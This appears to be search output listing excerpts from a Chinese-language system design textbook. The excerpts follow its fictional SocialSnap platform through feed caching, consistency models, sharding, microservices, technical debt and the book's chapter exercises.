  c26_b11.md: ...cialSnap 生产配置：K=2，gossip 间隔 1 秒，集群成员变更在 8 秒内全集群传播。  **Q3.** SocialSnap 键值集群 100 亿（10 billion）键分布在 100 节点（每节点 1 亿（100 million）键）。每个...
  c26_b13.md: ...m 系统** 使一致性成为可调参数，而非二元选择。W + R > N 给出强一致性；W + R ≤ N 给出最终一致性。SocialSnap 对不同数据类型使用不同 N/W/R 配置，反映它们不同的一致性需求。  **Sloppy quorum 加 hinte...
  c26_b13.md: ...** 无需中央协调器维护集群成员：信息指数级传播，O(log N) 轮 gossip 到达所有节点。  通过键值存储看 SocialSnap 完整技术栈，显示成熟系统对不同数据类型使用不同一致性配置——这是本书所教一切的实际应用。  第 27 章后退一步：这一...
  c26_b13.md: ...示成熟系统对不同数据类型使用不同一致性配置——这是本书所教一切的实际应用。  第 27 章后退一步：这一切是如何演进的？SocialSnap 的完整演进——从笔记本电脑上的一个 Python 函数（第 1 章）到第 26 章的分布式平台——就是真实系统如何构建...
  c27_b01.md: ...不完整、由自身也在不断变化的团队，一次一个决策地成长起来的。  第 27 章展示它们如何到达这里。  为此，我们将回顾 SocialSnap 从最开始的完整旅程——第 1 章笔记本电脑上的一个 Python 函数——到第 26 章分布式基础设施的每一次架构拐点...
  c27_b01.md: ...完整旅程——第 1 章笔记本电脑上的一个 Python 函数——到第 26 章分布式基础设施的每一次架构拐点。重新审视 SocialSnap 团队做出的每个决策，并以后见之明来看。  目标不是庆祝他们的好决策或嘲笑早期决策。而是理解决策在团队当时所知信息下为何...
  c27_b01.md: ...笑早期决策。而是理解决策在团队当时所知信息下为何正确，以及哪些信号表明是时候改变。  * * *   ### 27.1 SocialSnap 完整演进——完整回顾  让我们按顺序追踪 SocialSnap 的每个架构版本。   #### v0 —— 第 1 章...
  c27_b01.md: ...号表明是时候改变。  * * *   ### 27.1 SocialSnap 完整演进——完整回顾  让我们按顺序追踪 SocialSnap 的每个架构版本。   #### v0 —— 第 1 章：笔记本电脑上的一个函数（第 1–4 周）  **它是什么：**...
  c27_b03.md: ...*第一次故障：** 向水平扩展迁移期间，团队因负载均衡器配置错误导致 45 分钟故障，所有流量被路由到一台服务器。这是 SocialSnap 第一次生产故障，也让团队开始接触 post-mortem（第 28 章详述）。  **技术债务：** 数据库现在成为单...
  c27_b03.md: ...*它是什么：** 添加 PostgreSQL 读取副本（最初两个）以卸载读查询。随着写负载增长，users 表被分片——SocialSnap 数据首次跨多个数据库分割。  **关键决策：**  * 读取副本用于 feed、profile 读取和搜索查询 * 所...
  c27_b04.md: ...难。   #### v7 —— 第 21 章：完整的现代架构（第 36–48 个月）  **它是什么：** 完整的现代 SocialSnap 架构：Kubernetes 编排、Jaeger 分布式追踪、ELK 集中日志、Kafka 事件骨干、CDN 媒体交付、...
  c27_b04.md: ...基于 ML 的 feed 排序（第 22 章排序部分） * 工程团队增长到 80 人，跨越 8 个服务团队  到 v7，SocialSnap 的架构已类似于案例研究章节中描述的主要社交平台。但注意：它花了 48 个月才达到这里。它不是一次性设计出来的。每个组件...
  c27_b04.md: ...有系统 demonstrably 无法处理负载时才添加。  * * *   ### 27.2 技术债务——分类与管理  SocialSnap 的每个版本都产生了技术债务。不是因为工程师粗心——而是因为他们理性。技术债务是现在采取更简单、更快实现方案所对应的未来...
  c27_b05.md: ...r_id mod 8`）对当前规模有效，但限制未来选项。这是最昂贵的一类：需要重新架构整个系统，而不仅仅是重构代码。  SocialSnap 的分片键是架构债务。团队最终用 3 个月迁移到一致性哈希来偿还——昂贵投资，但随着系统需要扩展到 8 个分片以上，不可...
  c27_b05.md: ...。事实上，技术债务往往是出色工程判断的结果：选择最简单的方案解决今天的问题，知道当问题真正被理解时可以构建更通用的方案。SocialSnap 的模运算分片键不是错误；对 5 名从未运维过分片数据库、需要交付的工程师团队来说，它是正确选择。错误会是在没有任何证据...
  c27_b06.md: ...生长，逐渐接管，直到寄主树死亡，绞杀榕成为自支撑结构。寄主树（旧系统）被“绞杀”——不是突然被砍死，而是逐渐被取代。  SocialSnap 把单体分解为微服务时使用了该模式。他们从提取 Notification Service 开始——风险低、边界清晰的功能...
  c27_b06.md: ...作为跨四个维度比较设计选择的工具被引入。全书过程中，每新增一个构建块、扩展模式和案例研究，我们都往矩阵里加行。  对 SocialSnap，Tradeoff Matrix 不是写一次就归档的文档。它是架构团队每次重大设计决策都更新的活工件。看它是如何演变的：...
  c27_b06.md: ...radeoff Matrix，不仅理解决策是什么，还理解决策为什么做。矩阵捕获推理，而不仅仅是结论。  到第 26 章，SocialSnap 的 Tradeoff Matrix 已有数十行。第 28 章呈现完整版——全书完整参考卡。  * * *...
  c27_b07.md: ...6 个团队：单体成为瓶颈。团队相互阻塞部署；一个团队有 bug 的部署破坏另一个团队的服务。架构必须沿团队边界分解。  SocialSnap 的微服务分解（v6）既是组织需要，也是技术需要。Feed Service 团队需要快速迭代排序算法，而无需等待完整单体...
  c27_b07.md: ...不是脱离构建和维护它的组织而存在的。技术决策和组织决策密不可分。  * * *   ### 27.5 演进式架构原则  SocialSnap 的旅程说明了几条演进式架构原则——为变化而设计的系统。  **适应度函数（fitness functions）：**...
  c27_b07.md: ...函数（fitness functions）：** 演进式架构有明确的适应度函数——衡量架构是否达成目标的自动化检查。对 SocialSnap，适应度函数包括：  * p99 API 响应时间 < 200ms（持续测量） * 新代码不引入跨服务事务依赖（架构约束...
  c27_b07.md: ...表扫描新查询）  若代码变更违反适应度函数，CI/CD 流水线会阻止部署。这使架构决策自动执行。  **增量变更：** SocialSnap 的每个架构变更都是增量且可回滚（或至少可恢复）的。团队从不进行不可逆的架构变更，除非经过广泛规划和回滚程序。  **适...
  c27_b07.md: ...非经过广泛规划和回滚程序。  **适时复杂度：** 只在现有系统 demonstrably 无法满足需求时才增加复杂度。SocialSnap 在技术必要性出现数月后才添加分片——但也没更早。避免的每个过早优化都节省了数周工程时间。  **最小化耦合：** 架构...
  c27_b08.md: ...#### 概念检测  **Q1.** SocialSnap v5 分片使用 `user_id mod 8`。当团队想添加第 9 个分片时，这会产生什么问题，一致性哈希如何解决？...
  c27_b09.md: ...级技术债务更昂贵？  **答案：** 架构债务是在系统结构层面的设计决策，对当前规模和上下文合适，但限制未来演进。例子：SocialSnap 的模运算分片键、后来需要多区域部署的单体数据库、后来需要解耦的服务间同步 API 调用。架构债务比代码债务更昂贵，因为...
  c27_b10.md: ...#### 应用问题  **Q1.** SocialSnap 工程团队正在决定是否把 User Service 拆成两个独立服务：Profile Service（处理用户 prof...
  c27_b10.md: ...么？）；两个数据库管理；两条部署流水线。对安全与产品职责明确分离的 80 人团队，这次拆分可能值得。  **Q2.** SocialSnap 团队决定因性能原因把通知服务从 Python 重写成 Go。设计一个 strangler fig 迁移计划，让他们能在...
  c27_b11.md: ...ip（第 26 章）在 10 秒内传播到所有路由节点。  **Q3.** 从 Tradeoff Matrix 视角审视 SocialSnap 演进。在每次主要版本变更（v1 到 v7）中，找出一个设计决策、它做出的权衡以及表明该做该权衡的信号。把答案格式化为表...
  c27_b12.md: ...#### 深入思考  **Q1.** SocialSnap 4 年内从 0 增长到 80 名工程师。架构在此期间发生巨大变化。如果创始人试图从第一天就设计 v7 架构，会发生什么...
  c27_b13.md: ...（数据库分片键、一致性模型、事件 schema 设计、服务边界）， upfront 多花成比例时间。分片键不可逆-昂贵：SocialSnap 花 3 个月从模运算迁移到一致性哈希。如果一开始就用一致性哈希，成本为零。但创始人在第 15 个月怎么可能知道要用一致...
  c27_b13.md: ...未知”变成“已知的 future work”，从而可管理。   ### 本章总结  本章后退一步，从具体系统抽离，审视 SocialSnap——以及扩展地说，真实系统——如何随时间演进。  SocialSnap 的完整旅程（v0 到 v7）表明，每个架构决策在...
  c27_b13.md: ...本章总结  本章后退一步，从具体系统抽离，审视 SocialSnap——以及扩展地说，真实系统——如何随时间演进。  SocialSnap 的完整旅程（v0 到 v7）表明，每个架构决策在其上下文中都合理。没有决策是错的；每个在当时都正确，并成为下一次演进的...
  c27_b13.md: ...新系统与旧系统并存，逐步转移流量，保持回滚能力。大爆炸重写几乎从不奏效。  **康威定律** 使组织结构与架构不可分割。SocialSnap 的微服务分解既由团队成长驱动（80 名工程师需要自治），也由技术需求驱动。  **权衡矩阵（Tradeoff Matr...
  c28_b01.md: ...及最终完成的权衡矩阵（Tradeoff Matrix）——全书所学压缩成一张参考卡。  然后，从第 1 章就陪伴我们的 SocialSnap 工程师，将获得最后的发言权。  * * *   ### 28.1 康威定律——组织的镜子  1967 年，Melvin...
  c28_b02.md: ...码之前。每个团队拥有一个服务，与其他团队有清晰的 API 契约，并独立部署。最终涌现的架构将与你建立的组织结构匹配。  SocialSnap 在 v6 有意识地这样做：在把单体分解为微服务之前，CTO 围绕预期的服务边界重组团队。Feed Team、User...
  c28_b05.md: ...感 API（冷启动延迟是问题）；长时间运行工作负载；有状态的（stateful）处理；需要细粒度性能调优的系统。  对 SocialSnap，serverless 适用于：图片处理（上传时调整照片大小）、定时数据导出、第三方集成 webhook 处理器。不适用...
  c28_b06.md: ...型任务。也无法直接访问私有数据库（数据库在源站）；只能访问已复制到边缘的数据（缓存、分发到边缘的 KV 存储）。  对 SocialSnap，边缘计算用于：JWT 验证、机器人检测、渲染初始页面 shell（JavaScript 框架填充的空 HTML），让浏...
  c28_b08.md: ...* IaC 工具可以比较基础设施实际状态与声明配置，并在两者偏离时告警（工程师绕过 IaC 流水线手动修改了什么）。  SocialSnap 的完整基础设施——200 台应用服务器、40 个数据库实例、15 个 Redis 集群、8 个 Kafka 集群、负载...
  c28_b08.md: ...文件描述。任何工程师运行 `terraform apply` 并等待 20 分钟（20 minutes）即可创建隔离的 SocialSnap 测试环境。  * * *...
  c28_b08.md: ...* IaC 工具可以比较基础设施实际状态与声明配置，并在两者偏离时告警（工程师绕过 IaC 流水线手动修改了什么）。  SocialSnap 的完整基础设施——200 台应用服务器、40 个数据库实例、15 个 Redis 集群、8 个 Kafka 集群、负载...
  c28_b08.md: ...文件描述。任何工程师运行 `terraform apply` 并等待 20 分钟（20 minutes）即可创建隔离的 SocialSnap 测试环境。  * * *...
  c28_b17.md: ...### 28.10 SocialSnap 的最后一章——团队成长  是时候最后访问一次 SocialSnap 了。  平台已经四岁了。它有 1500 万（15...
  c28_b17.md: ...### 28.10 SocialSnap 的最后一章——团队成长  是时候最后访问一次 SocialSnap 了。  平台已经四岁了。它有 1500 万（15 million）日活用户、每天服务 1 亿（100 million）...
  c28_b17.md: ...个重大架构决策都会新增一行。团队架构 lead 每季度审查一次，删除过时的行，并为团队考虑重新审视的选择添加上下文。  SocialSnap 仍用 PostgreSQL 存储主要用户和帖子数据。仍用 Redis 做缓存。仍用 Kafka 做事件骨干。2020...
  c28_b18.md: ...#### 概念检测  **Q1.** 用自己的话陈述康威定律，并举例说明来自 SocialSnap 历史或你了解的系统。  **答案：** 康威定律：组织的沟通结构倾向于反映在其构建的软件设计中。系统有接口的地方就是团...
  c28_b18.md: ...系统。  **答案：** 康威定律：组织的沟通结构倾向于反映在其构建的软件设计中。系统有接口的地方就是团队有接口的地方。SocialSnap 的具体例子：工程团队是 8 个人同一房间时，系统是单体——大家自由沟通，代码深度集成。团队增长到 50 人、跨越多个办...
  c28_b18.md: ...定时触发）。低运营开销——无需维护服务器。  **Q3.** 完成的权衡矩阵（Tradeoff Matrix）包含许多 SocialSnap 同时使用的模式的行。任选两行代表冲突的权衡——改善一行的某个轴会使另一行同一轴更差——并解释张力。  （术语译法：有状...
  c28_b19.md: ...：**Redis 键值存储（最终一致性、极低延迟）** 和 **ACID 关系型数据库（强一致性、更高延迟）**。张力：SocialSnap 用 Redis 做 timeline 缓存（第 22 章）——feed 可接受最终一致性。同样数据（帖子内容）存在 P...
  c28_b20.md: ...提取。永远不要在没准备好 owning 团队的团队前拆分服务。  **Q2.** 用 28.7 节的技术评估框架，评估 SocialSnap 是否应采纳新的时序数据库（如 InfluxDB 或 TimescaleDB）来存储当前存在 PostgreSQL 中的...
  c28_b20.md: ...PostgreSQL 中的指标和监控数据。应用框架的全部六个问题。  提示  思考指标数据的具体访问模式。指标数据与 SocialSnap 的用户/帖子数据有何不同？时序数据库与关系型数据库在该用例上有何不同？...
  c28_b21.md: ...理解。为熟悉度偏好 TimescaleDB。4. 运营模型？TimescaleDB 运行在 PostgreSQL 上——SocialSnap 团队已经在运维 PostgreSQL。所需新运营专长最少。InfluxDB 需要新工具链。TimescaleDB 在运...
  c28_b21.md: ...采纳 TimescaleDB。它解决真实问题，故障模式可接受，运营 familiar，退出策略清晰。  **Q3.** SocialSnap 经历了一次 45 分钟（45-minute）故障：数据库迁移意外删除了 `posts` 表上的索引，导致每个 feed...
  c28_b22.md: ..._idx` 和 `posts_user_id_created_at_idx`），且迁移没有交叉引用生产查询计划。为什么？SocialSnap 的 staging 环境没有运行 `EXPLAIN ANALYZE` 回归测试；迁移只测试了语法正确性，没测试查询计划...
  c28_b24.md: ...**康威定律** 解释为什么组织与架构相互映射。**逆康威机动** 把这一观察变成处方：先按你想构建的架构设计组织。SocialSnap 在微服务迁移前的团队重组就是这一原则的有意应用。  **无责备 post-mortem** 和 on-call 文化决...
  c28_b24.md: ...块和设计选择映射到其在延迟、一致性、可用性和运营复杂度上的成本。把它当作参考，更重要的是，当作思考任何新模式的模型。  SocialSnap 的最后一章最具人文色彩：80 名工程师、8 个团队、一对仍记得笔记本电脑上 Python 函数的创始人。系统不是通过宏...
  intro.md: ...，哪些 tradeoff（权衡）始终在场，以及为什么看似随意的选择一旦理解了约束，就会发现其实经过深思熟虑。  主线是 SocialSnap，一个虚构的社交平台。它从笔记本电脑上的一个 Python 函数开始，逐章演进为全球分布式服务：sharded data...
  intro.md: ...务器。你会看到它在负载下以真实系统崩溃的方式崩溃，看到修复方案被引入，然后看到下一个扩展天花板出现。到第 27 章回顾 SocialSnap 做过的每一个架构决策时，你已经和这些决策共处了数百页——它们会显得来之不易，而非抽象空洞。  另外两条线索贯穿全书。T...

=== feed (434 occurrences) ===
  c01_b06.md: ...何测试它、如何保护它（第 16–19 章）。  **全景图。** 完整的系统设计——URL 短链接服务、聊天应用、新闻 Feed、搜索引擎、视频平台——在那里你把所有东西一次性应用起来（第 20–26 章）。  **人的语境。** 系统由团队建造。...
  c02_b01.md: ...是从请求发出到响应收到之间经过的时间。它是单个操作经历的延迟。  用大白话说：延迟就是你等多久。如果你点击“加载我的 Feed”，1.2 秒后才有内容出现，延迟就是 1.2 秒。  Latency 通常这样度量：  * **p50（中位数）：**...
  c02_b03.md: ...一主页。服务器 B 还没收到更新。朋友看到的是旧头像。  这是问题吗？取决于差异持续多久、以及对你的用户有多重要。社交 Feed 里 5 秒的旧数据？可接受。电商网站的库存数据 5 秒的旧数据？你可能会卖出没有库存的商品。  Consistency...
  c02_b03.md: ...成后，不同节点的读可能暂时返回不同值。但如果没有新的写，所有节点_最终_会收敛到相同值。Amazon 购物车、社交媒体 Feed 和 DNS 记录都是最终一致系统的例子。  在这两个极端之间还有许多中间模型（read-your-writes con...
  c02_b06.md: ...对外承诺的 SLO，违反时会有后果（退款、赔偿）。这是你向外承诺的。  用大白话说：  * SLI：“过去 30 天，Feed 接口的 p99 延迟是 287ms。” * SLO：“Feed 接口的 p99 延迟应该低于 500ms。” * SL...
  c02_b06.md: ...诺的。  用大白话说：  * SLI：“过去 30 天，Feed 接口的 p99 延迟是 287ms。” * SLO：“Feed 接口的 p99 延迟应该低于 500ms。” * SLA：“如果某月 p99 延迟超过 500ms 的时间超过 0.1...
  c03_b02.md: ...→ 150 百万 DAU（1.5 亿） * **每个用户每天平均请求数：** 典型用户一天打开应用约 5 次，每次加载 Feed（1 次请求）、滚动（约 10 次请求）、再看几个主页（3 次请求）。按每个用户每天约 50 次请求算。 * **每天总...
  c03_b03.md: ...们假设每个用户每天 50 次请求。这感觉对吗？  想想你自己用 Twitter 的情况。你一天打开 5 次吗？每次都看 Feed 吗？很可能是。每个活跃用户每天 50 次请求偏低，这暗示我们的估算对“活跃”用户可能偏保守——但 150 百万（1.5...
  c03_b05.md: ...）注册用户，300,000（300K）日活用户（DAU/MAU 比例 30%——社交平台典型值） * 每个用户每天加载 Feed 5 次、看 3 个主页、每 3 天发 1 帖、每天点 10 个赞 * Feed 页：10 条帖子 ×（200 字节文字...
  c03_b05.md: ...社交平台典型值） * 每个用户每天加载 Feed 5 次、看 3 个主页、每 3 天发 1 帖、每天点 10 个赞 * Feed 页：10 条帖子 ×（200 字节文字 + 1 张 20 KB 缩略图） = 每次 Feed 加载约 200 KB *...
  c03_b05.md: ...、每天点 10 个赞 * Feed 页：10 条帖子 ×（200 字节文字 + 1 张 20 KB 缩略图） = 每次 Feed 加载约 200 KB * 主页：约 50 KB * 发帖：200 字节文字 + 0% 图片（暂时简化） * 点赞：10...
  c03_b05.md: ...字节元数据  **QPS 计算：**  | 行为 | 每日次数 | 每秒（平均） | |---|---|---| | Feed 加载 | 300K × 5 = 1.5M（150 万） | 17 QPS | | 主页查看 | 300K × 3 =...
  c03_b05.md: ...）/天** | **约 63 QPS 平均** |  峰值（平均 3 倍）：约 190 QPS  **带宽：**  * Feed 加载：17 QPS × 200 KB = 3.4 MB/s 读 * 主页查看：10 QPS × 50 KB = 500...
  c03_b05.md: ...× 365 = 7.3 GB/年 * 点赞：300 万赞/天 × 100 字节 × 365 = 110 GB/年 * Feed 缓存数据：少量 * **总计：约 120 GB/年** → 5 年后约 600 GB  **100 万用户时 Soci...
  c03_b05.md: ...户开始。  这是个有用的结果。它告诉新工程师：“不要过早扩展。在这个规模，一个 PostgreSQL 数据库加一个用于 Feed 数据的 Redis 缓存可能就够。等有证据表明需要时再加复杂度。”   ### 3.7 练习...
  c03_b07.md: ...户、每人每天发 1 帖，估算：(a) 视频每年额外增长多少存储；(b) 服务视频内容需要额外多少带宽（假设 20% 的 Feed 加载包含一个自动播放视频）；(c) 一条 10 Gbps 网络连接能否处理。  提示  这与 3.5 节方法相同。先算...
  c03_b07.md: ...。  **(b) 视频服务带宽：** 从 3.5 节可知，500 万 DAU 的 SocialSnap 大致有：  * Feed 加载：5M × 5/天 = 25M/天（2500 万/天）= 289 QPS 平均 → 870 QPS 峰值  如果...
  c03_b07.md: ...× 5/天 = 25M/天（2500 万/天）= 289 QPS 平均 → 870 QPS 峰值  如果 20% 的 Feed 加载包含一个自动播放视频，码率（比如）2 Mbps：...
  c03_b09.md: ...论？  **讨论：** 工程师 B 的论据建立在跨洲延迟差距上。伦敦用户加载由纽约源服务器服务的 SocialSnap Feed，仅数据包（packet）的网络（network）往返就要约 150 ms——还没算处理时间。如果该 Feed 页 20...
  c03_b09.md: ...Snap Feed，仅数据包（packet）的网络（network）往返就要约 150 ms——还没算处理时间。如果该 Feed 页 200 KB（10 条带缩略图的帖子），浏览器还要以典型跨洲带宽下载：有效吞吐 10 Mbps 时，这又要 160...
  c03_b09.md: ...对比伦敦的 CDN 边缘节点。同一数据中心往返：约 0.5 ms。CDN 在 5 ms 内 serving 缓存的 Feed。总延迟：约 5 ms——对欧洲用户提升 60 倍。  定量论据是：“如果 30% 用户在北美之外，他们每次页面加载至少...
  c04_b04.md: ...k，见第 14 章）。比顺序一致性便宜。  示例用例：评论线程（回复必须出现在原评之后）。一个动作引发另一个动作的社交 Feed。   #### 读己之写一致性（Read-Your-Writes）  你写入一个值后，再查询时（从任何节点）总会读回该...
  c04_b05.md: ...也可能是分钟，真实事故中不一致曾持续数小时。  最终一致性对用户来说是什么样子的具体例子：  **例子 1：过时的社交 Feed。** 你在 SocialSnap 上发了“我拿到 offer 了！”。你的朋友请求被路由到另一个副本，刷新 Feed...
  c04_b05.md: ...Feed。** 你在 SocialSnap 上发了“我拿到 offer 了！”。你的朋友请求被路由到另一个副本，刷新 Feed 没看到你的帖子。3 秒后他们再刷新，看到了。这是可接受的最终一致性。  **例子 2：冲突的购物车。** 你用 Dyn...
  c04_b06.md: ...做具体决策。  **SocialSnap 的组件清单：**  * 用户认证（登录、token） * 帖子（创建、读取、Feed） * 关注关系 * 私信 * 点赞数  对每一项，选择合适的一致性模型：  | 组件 | 一致性级别 | 理由 | |...
  c04_b06.md: ...| | 用户资料（姓名、简介） | 读己之写 | 用户应看到自己编辑；别人看到 2–3 秒旧数据可接受 | | 帖子 Feed | 最终一致性 | Feed 略旧可接受；我们希望最大可用性 | | 关注关系 | 因果一致性 | 我关注你后，我应在...
  c04_b06.md: ...） | 读己之写 | 用户应看到自己编辑；别人看到 2–3 秒旧数据可接受 | | 帖子 Feed | 最终一致性 | Feed 略旧可接受；我们希望最大可用性 | | 关注关系 | 因果一致性 | 我关注你后，我应在自己的 Feed 看到你的帖子...
  c04_b06.md: ...终一致性 | Feed 略旧可接受；我们希望最大可用性 | | 关注关系 | 因果一致性 | 我关注你后，我应在自己的 Feed 看到你的帖子（因果依赖） | | 私信 | 至少读己之写 | 我应立刻看到自己发的消息 | | 点赞数 | 最终一致性...
  c04_b09.md: ...性对用户影响很小：玩家更新分数后，2–3 秒才出现在全球排行榜上是可以接受的。排行榜用户知道他们看到的是快照，不是实时 Feed。“你排第 42 名”和“接下来 3 秒你排第 43 名”之间的差异没有实际意义。  **最终一致性的用户体验：** 玩...
  c05_b06.md: ...建唯一约束（你不能关注同一个人两次），并创建复合索引，让 “Alice 是否关注 Bob？” 能快速查找。  **主页 Feed 查询**——“给 Alice 看她关注的人最近 20 条帖子”：      SELECT posts.id, post...
  c05_b06.md: ...有合适的索引，当 Alice 关注的人数合理（几百人）时，它很快。当 Alice 关注 10,000（1 万）人、她的 Feed 跨越数百万帖子时，join 会变成大型排序操作。我们将在 Feed 案例研究（第 22 章）解决这个问题。...
  c05_b06.md: ...Alice 关注 10,000（1 万）人、她的 Feed 跨越数百万帖子时，join 会变成大型排序操作。我们将在 Feed 案例研究（第 22 章）解决这个问题。...
  c06_b06.md: ...们不能正确，宁可不可用。” BASE 说：“可用性至上。与其给用户看错误页面，不如给他们看略旧的数据。”  对社交媒体 Feed，旧数据可接受。对银行，不可接受。这就是为什么两种哲学都有一席之地——以及为什么复杂系统常同时包含 ACID 和 BAS...
  c06_b15.md: ...确性而非可用性；BASE 系统优先可用性而非一致性。合适选择取决于不一致对用户可见后果——金融数据需要 ACID，社交 Feed 可接受 BASE。  **决策框架**——先访问模式，再 schema 稳定性、一致性需求、规模和团队经验——给你一种...
  c07_b07.md: ...持：** 排行榜、限流（score = 时间戳）、热门标签（score = 计数）。  **列表支持：** 队列、活动 Feed（从头部 push，从头部/尾部读取）。  **原子计数器操作：** `INCR counter_key` 原子递增计数...
  c07_b09.md: ...存刷新。用户立即得到略旧的响应，而不是等待。缓存在后台刷新。这是浏览器对某些缓存头采用的方法——概念上也是许多社交媒体 Feed 的工作方式。  每个方案都增加运维复杂度。当我们把这些故障模式考虑进去，权衡矩阵中缓存那一行就变得更丰富。...
  c07_b13.md: ...*答案：**  **(a) 用户头像照片：**  访问模式：读密集型。用户的照片出现在他们发的每篇帖子、每条评论、粉丝 Feed 的每一页。变化很少——用户一年可能只更新几次头像。旧数据后果：刚更新头像的用户几分钟内看到旧照片——有点烦人，但可接受...
  c07_b14.md: ...用于速度，关系型数据库用于持久性**。  **Q3.**（联系第 6 章 NoSQL 家族）SocialSnap 主页 Feed 向每个用户展示其所关注人最新帖子的排序列表。Feed 计算昂贵：需要 join `follows` 表和 `posts...
  c07_b14.md: ...*（联系第 6 章 NoSQL 家族）SocialSnap 主页 Feed 向每个用户展示其所关注人最新帖子的排序列表。Feed 计算昂贵：需要 join `follows` 表和 `posts` 表，按时间/排序分排序，取 Top 50 帖子。每...
  c07_b14.md: ...sts` 表，按时间/排序分排序，取 Top 50 帖子。每天有 500,000 名活跃用户，每人平均每天加载 8 次 Feed，该查询每天运行约 4 百万（400 万）次（平均约 46 次/秒，峰值约 200 次/秒）。单台 PostgreSQL...
  c07_b15.md: ...Feed 是 per-user 的——每个用户看到不同 Feed。这意味着每个用户一个缓存 key。想想 Feed 多久变化：用...
  c07_b15.md: ...Feed 是 per-user 的——每个用户看到不同 Feed。这意味着每个用户一个缓存 key。想想 Feed 多久变化：用户网络中某处有新帖子。每个被关注用户的每篇新帖子都要使每...
  c07_b15.md: ...Feed 是 per-user 的——每个用户看到不同 Feed。这意味着每个用户一个缓存 key。想想 Feed 多久变化：用户网络中某处有新帖子。每个被关注用户的每篇新帖子都要使每个粉丝的 Feed 缓存失效吗？在什么规模下这变得...
  c07_b15.md: ...每个用户一个缓存 key。想想 Feed 多久变化：用户网络中某处有新帖子。每个被关注用户的每篇新帖子都要使每个粉丝的 Feed 缓存失效吗？在什么规模下这变得不可行？  **答案：**  **缓存 key：** `user:{user_id}:f...
  c07_b15.md: ...d 缓存失效吗？在什么规模下这变得不可行？  **答案：**  **缓存 key：** `user:{user_id}:feed` —— 每个用户一个条目，存储 Top 50 帖子 ID 及其排序分的序列化列表。  **TTL：** 2–5 分钟。...
  c07_b15.md: ...存储 Top 50 帖子 ID 及其排序分的序列化列表。  **TTL：** 2–5 分钟。只要用户关注的人发了新帖子，Feed 就会变。对关注 300 个账户的用户，高峰期间每隔几分钟就有新帖。2 分钟 TTL 意味着 Feed 数据最多 2 分...
  c07_b15.md: ...注的人发了新帖子，Feed 就会变。对关注 300 个账户的用户，高峰期间每隔几分钟就有新帖。2 分钟 TTL 意味着 Feed 数据最多 2 分钟旧——对社交 Feed 可接受，精确 recency 并不关键。足够短，用户在合理窗口内看到新帖；足...
  c07_b15.md: ...300 个账户的用户，高峰期间每隔几分钟就有新帖。2 分钟 TTL 意味着 Feed 数据最多 2 分钟旧——对社交 Feed 可接受，精确 recency 并不关键。足够短，用户在合理窗口内看到新帖；足够长，提供有意义的缓存保护。  **驱逐策...
  c07_b15.md: ...并不关键。足够短，用户在合理窗口内看到新帖；足够长，提供有意义的缓存保护。  **驱逐策略：** LRU。最近没加载 Feed 的用户（不活跃用户）缓存条目会被自然驱逐。每周只登录一次的用户没必要整周缓存其 Feed——到那时完全陈旧了。LRU...
  c07_b15.md: ...略：** LRU。最近没加载 Feed 的用户（不活跃用户）缓存条目会被自然驱逐。每周只登录一次的用户没必要整周缓存其 Feed——到那时完全陈旧了。LRU 自然保留最近活跃用户的 Feed。  **失效逻辑（两层方案）：**  _第一层（Tier...
  c07_b15.md: ...存条目会被自然驱逐。每周只登录一次的用户没必要整周缓存其 Feed——到那时完全陈旧了。LRU 自然保留最近活跃用户的 Feed。  **失效逻辑（两层方案）：**  _第一层（Tier 1）——基于 TTL 的过期（主要）。_ 最务实的方法：让...
  c07_b15.md: ...方案）：**  _第一层（Tier 1）——基于 TTL 的过期（主要）。_ 最务实的方法：让 TTL 处理大部分失效。Feed 条目过期时，下一次请求从数据库重建。2 分钟 TTL 下，过期事件之间 90%+ 的 Feed 读会命中缓存。估算数据...
  c07_b15.md: ...TTL 处理大部分失效。Feed 条目过期时，下一次请求从数据库重建。2 分钟 TTL 下，过期事件之间 90%+ 的 Feed 读会命中缓存。估算数据库负载：峰值 200 QPS × 10% 未命中率 = 峰值 20 个 Feed 查询/秒——在...
  c07_b15.md: ...90%+ 的 Feed 读会命中缓存。估算数据库负载：峰值 200 QPS × 10% 未命中率 = 峰值 20 个 Feed 查询/秒——在 PostgreSQL 能力范围内。  _第二层（Tier 2）——高影响事件的选择性失效（可选，用于改...
  c07_b15.md: ...eeper 里提到的惊群问题。相反，让这些缓存按 TTL 自然过期。对普通用户（粉丝 <1,000），发帖时使其粉丝的 Feed 缓存失效是可行的：对每个粉丝执行 `DEL user:{follower_id}:feed`。这确保粉丝更快看到新帖，...
  c07_b15.md: ...000），发帖时使其粉丝的 Feed 缓存失效是可行的：对每个粉丝执行 `DEL user:{follower_id}:feed`。这确保粉丝更快看到新帖，同时没有惊群风险。  **为什么这能降低 >90% 负载：**  2 分钟 TTL、平均每个...
  c07_b15.md: ...新帖，同时没有惊群风险。  **为什么这能降低 >90% 负载：**  2 分钟 TTL、平均每个用户每天加载 8 次 Feed，预期缓存命中率：用户的 Feed 大约每 2 分钟从数据库重建一次（每小时 30 次），但每天只加载 8 次（平均每小...
  c07_b15.md: ...什么这能降低 >90% 负载：**  2 分钟 TTL、平均每个用户每天加载 8 次 Feed，预期缓存命中率：用户的 Feed 大约每 2 分钟从数据库重建一次（每小时 30 次），但每天只加载 8 次（平均每小时 0.33 次）。在重建之间，多...
  c07_b15.md: ...约每 2 分钟从数据库重建一次（每小时 30 次），但每天只加载 8 次（平均每小时 0.33 次）。在重建之间，多次 Feed 加载命中缓存。在 46 平均 QPS、2 分钟缓存生命周期下，一次数据库查询服务约 46 × 120 秒 ÷ 500,...
  c07_b15.md: ...期下，一次数据库查询服务约 46 × 120 秒 ÷ 500,000 用户 × 用户 8 次加载……更直接的估算：因为 Feed 变化远少于读取，90%+ 命中率是可实现的。大多数用户在同一个 2 分钟 TTL 窗口内多次加载其 Feed，全部命中...
  c07_b15.md: ...算：因为 Feed 变化远少于读取，90%+ 命中率是可实现的。大多数用户在同一个 2 分钟 TTL 窗口内多次加载其 Feed，全部命中缓存。...
  c07_b16.md: ...TTL，每次写入都触发缓存失效事件。用户 Alice 更新任何字段，我们就使她资料缓存失效。新帖子创建，就使所有粉丝的 Feed 缓存失效。” 分析这个提案。它对在哪里？它带来什么 TTL 能避免的故障模式？  **讨论：** Phil 的提案有一...
  c07_b16.md: ...性关键的应用——金融数据、健康记录——这是正确目标。  但这个提案包含一个在规模下才显现的隐藏复杂度。考虑“使所有粉丝 Feed 缓存失效”的情况。一个有 500 万粉丝的名人发了帖子。你现在需要使 500 万个缓存条目失效。怎么做？你可以遍历全部...
